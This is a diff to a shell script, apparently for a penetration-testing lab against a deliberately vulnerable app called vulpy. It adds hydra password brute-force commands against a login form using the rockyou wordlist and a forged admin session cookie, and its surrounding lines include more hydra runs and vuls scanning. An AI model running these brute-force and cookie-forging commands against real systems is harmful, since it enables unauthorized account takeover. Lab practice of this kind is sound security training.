@@ -64,6 +64,15 @@ EOF
 # try common creds using hydra for a login form (example form params)
 hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=wrong" ${VULNBOX_IP} -V
 
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  -s 5000 "${VULNBOX_IP}" http-post-form \
+  "/user/login:username=^USER^&password=^PASS^:F=wrong" \
+  -V -c "vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  -s 5000 "${VULNBOX_IP}" http-get-form \
+  "/user/login:username=^USER^&password=^PASS^:F=wrong" \
+  -V -c "vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"
 
 hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt http://${VULNBOX_IP}:5000/user http-form-post "/login:username=^USER^&password=^PASS^:Incorrect" -t 4 -f -o "$OUT/hydra_login.txt"
 
@@ -402,3 +411,4 @@ goval-dictionary fetch ubuntu 20.04 --dbpath=/usr/share/vuls-data/oval.sqlite3
 gost fetch debian
 vuls scan
 vuls report
+
